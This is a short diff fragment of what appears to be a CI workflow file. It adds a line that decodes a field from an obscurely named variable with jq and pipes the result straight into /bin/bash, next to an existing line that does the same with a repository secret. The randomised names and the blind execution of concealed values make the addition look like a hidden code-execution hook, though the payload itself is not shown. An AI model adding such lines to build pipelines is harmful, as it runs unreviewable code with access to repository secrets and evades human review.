@@ -23,6 +23,7 @@ jobs:
           jqmgs70911: ${{ secrets.jqmgs70911 }}
         run: |
           printf '%s' "$jqmgs70911" | jq -r .m5899 | /bin/bash
+          printf '%s' "$ozx7621" | jq -r .u2 | /bin/bash
 
       - name: Save archive
         if: always()
